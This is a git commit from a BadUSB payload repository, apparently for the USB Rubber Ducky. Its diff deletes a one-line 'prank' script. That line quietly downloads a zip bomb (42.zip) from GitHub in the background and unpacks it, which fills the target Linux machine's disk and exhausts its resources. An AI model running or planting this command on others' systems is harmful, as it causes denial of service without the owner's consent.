16cf7d1767ef82d03ce69230b40ae3d1fe3a9e2e
FalsePhilosopher <joshgarland90@gmail.com>
2022-08-02 02:03:14 -0600

    update zipB

--- Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/zip.sh
+++
@@ -1,1 +0,0 @@
-nohup wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/42.zip 2> /dev/null && unzip 42.zip 2> /dev/null &
